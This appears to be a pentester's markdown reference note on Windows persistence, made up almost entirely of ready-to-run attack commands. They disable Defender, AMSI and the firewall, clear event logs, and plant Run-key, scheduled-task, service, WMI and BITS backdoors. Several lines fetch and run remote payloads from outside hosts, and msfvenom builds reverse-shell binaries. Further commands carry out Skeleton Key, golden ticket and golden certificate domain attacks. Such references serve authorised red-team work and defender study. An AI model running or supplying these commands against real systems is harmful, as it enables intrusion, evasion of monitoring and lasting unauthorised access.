---
title: "Windows Persistence Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - reference-note
  - windows
  - persistence
  - backdoor
  - registry
  - scheduled-tasks
---

# Windows Persistence Reference

Techniques for maintaining access on Windows systems across reboots and sessions.

Related: [[Windows-Privilege-Escalation-Reference]] | [[AD-Kerberos-Attacks]] | [[Active-Directory-Cheatsheet]]

---

## Tools

- [SharPersist](https://github.com/fireeye/SharPersist) - Windows persistence toolkit written in C#

---

## Hide Your Binary

Sets the Hidden file attribute on a file.

```ps1
PS> attrib +h mimikatz.exe
```

---

## Disable Antivirus and Security

### Disable Windows Defender

```powershell
# Disable Defender
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

# Exclude a process / location
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install

# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
Set-MpPreference -DisableIOAVProtection $true
# Disable AMSI (set to 0 to enable)
Set-MpPreference -DisableScriptScanning 1

# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

# Wipe currently stored definitions
MpCmdRun.exe -RemoveDefinitions -All
& "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# Disable Windows Defender Security Center
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

# Disable Real Time Protection
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
```

### Disable Windows Firewall

```powershell
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

# IP whitelisting
New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```

### Clear System and Security Logs

```powershell
cmd.exe /c wevtutil.exe cl System
cmd.exe /c wevtutil.exe cl Security
```

---

## Simple User (No Admin Required)

### Registry HKCU

Create a REG_SZ value in the Run key within HKCU\Software\Microsoft\Windows.

```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\Users\user\backdoor.exe"
```

Using SharPersist:

```powershell
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
```

### Startup Folder (User)

Create a batch script in the user startup folder.

```powershell
# Path: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
```

Using SharPersist:

```powershell
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
```

### Scheduled Tasks (User)

Using native schtask - create once at 00:00:

```powershell
schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
schtasks /run /tn "Device-Synchronize"
```

Modify an existing task:

```powershell
SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
```

Using PowerShell:

```powershell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
$T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
$P = New-ScheduledTaskPrincipal "Rasta"
$S = New-ScheduledTaskSettingsSet
$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
Register-ScheduledTask Backdoor -InputObject $D
```

Using SharPersist:

```powershell
# Add to a current scheduled task
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

# Add new task
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
```

### BITS Jobs

```powershell
bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"

# v1
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor

# v2 - exploit/multi/script/web_delivery
bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
bitsadmin /resume backdoor
```

### COM TypeLib

Use Procmon to find `RegOpenKey` with status `NAME NOT FOUND` in `explorer.exe`.

```ps1
# Registry path
Path: HKCU\Software\Classes\TypeLib\{CLSID}\1.1\0\win32
Path: HKCU\Software\Classes\TypeLib\{CLSID}\1.1\0\win64
Name: anything
Type: REG_SZ
Value: script:C:\1.sct
```

---

## Serviceland

### IIS Backdoor

```powershell
git clone https://github.com/0x09AL/IIS-Raid
python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```

### Windows Service (User)

```powershell
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
```

---

## Elevated Persistence (Admin Required)

### Registry HKLM

```powershell
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
```

#### Winlogon Helper DLL

Runs executable during Windows logon.

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll

reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
```

#### GlobalFlag (Image File Execution Options)

Runs executable after notepad is killed.

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
```

### Startup Folder (Elevated)

```powershell
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

### Services (Elevated)

```powershell
# PowerShell
New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic
sc start Backdoor

# SharPersist
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add

# sc
sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
sc start Backdoor
```

### Service Security Descriptor (SCManager Abuse)

Allow any non-admin user to have full SYSTEM permissions persistently.

```ps1
# Grant full control to all users over Service Control Manager
sc.exe sdset scmanager D:(A;;KA;;;WD)

# Check current permissions
sc.exe sdshow scmanager

# Create a service that grants admin to a user (runs on reboot)
sc create LPE displayName= "LPE" binPath= "C:\Windows\System32\net.exe localgroup Administrators user_basic /add" start= auto
```

### Scheduled Tasks (SYSTEM)

Processes spawned as scheduled tasks have `taskeng.exe` as parent.

```powershell
# PowerShell - daily at 9am as SYSTEM
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\backdoor.exe"
$T = New-ScheduledTaskTrigger -Daily -At 9am
$P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
$S = New-ScheduledTaskSettingsSet
$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
Register-ScheduledTask "Backdoor" -InputObject $D

# Native schtasks - every minute as SYSTEM
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password

# On user login (x86)
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System

# On system start (x86)
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System

# On user idle 30 mins (x64)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
```

### WMI Event Subscription

Executes code when a defined event occurs — survives reboots.

Components:
- `__EventFilter`: Trigger (new process, failed logon, etc.)
- `EventConsumer`: Perform Action (execute payload)
- `__FilterToConsumerBinding`: Binds Filter and Consumer

```ps1
# Using CMD - execute binary 60 seconds after Windows started
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="WMIPersist", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WMIPersist", ExecutablePath="C:\Windows\System32\binary.exe",CommandLineTemplate="C:\Windows\System32\binary.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"WMIPersist\"", Consumer="CommandLineEventConsumer.Name=\"WMIPersist\""

# Remove it
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='WMIPersist'" | Remove-WmiObject -Verbose

# Using PowerShell (deploy)
$FilterArgs = @{name='WMIPersist'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 90"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
$ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate="$($Env:SystemRoot)\System32\binary.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs

# Using PowerShell (remove)
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'WMIPersist'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'WMIPersist'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
```

---

## Binary Replacement

### Accessibility Binaries (Windows XP+)

Replacing accessibility binaries allows execution at the Windows login screen.

| Feature            | Executable                             |
|--------------------|----------------------------------------|
| Sticky Keys        | C:\Windows\System32\sethc.exe          |
| Accessibility Menu | C:\Windows\System32\utilman.exe        |
| On-Screen Keyboard | C:\Windows\System32\osk.exe            |
| Magnifier          | C:\Windows\System32\Magnify.exe        |
| Narrator           | C:\Windows\System32\Narrator.exe       |
| Display Switcher   | C:\Windows\System32\DisplaySwitch.exe  |
| App Switcher       | C:\Windows\System32\AtBroker.exe       |

Metasploit: `use post/windows/manage/sticky_keys`

### DLL Hijacking via osk.exe (Windows 10+)

Create a malicious `HID.dll` at:
`C:\Program Files\Common Files\microsoft shared\ink\HID.dll`

---

## Domain Persistence

### Skeleton Key

Injects a master password into LSASS on a Domain Controller.

Requirements: Domain Administrator (SeDebugPrivilege) or `NT AUTHORITY\SYSTEM`

```powershell
# Execute the skeleton key attack
mimikatz "privilege::debug" "misc::skeleton"
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>

# Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

### Golden Certificate

Requires elevated privileges on ADCS machine.

```ps1
# Export CA certificate via Mimikatz
privilege::debug
crypto::capi
crypto::cng
crypto::certificates /systemstore:local_machine /store:my /export

# Forge a certificate for any active domain user
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123

# Request TGT using forged certificate
Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
```

### Golden Ticket

```ps1
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

### LAPS Persistence

Prevent a machine from updating its LAPS password by setting the expiry date in the future.

```ps1
Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

### WSL as Persistence Vector

```ps1
# List and install online packages
wsl --list --online
wsl --install -d kali-linux

# Run as root
wsl kali-linux --user root
```

---

## References

- [SharPersist Windows Persistence Toolkit - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
- [Persistence - Checklist - @netbiosX](https://github.com/netbiosX/Checklists/blob/master/Persistence.md)
- [Persistence via WMI Event Subscription - Elastic](https://www.elastic.co/guide/en/security/current/persistence-via-wmi-event-subscription.html)
- [PrivEsc: Abusing the Service Control Manager - 0xv1n - 2023](https://0xv1n.github.io/posts/scmanager/)
- [Golden Certificate - pentestlab.blog - 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
- [Hijack the TypeLib - CICADA8 - 2024](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
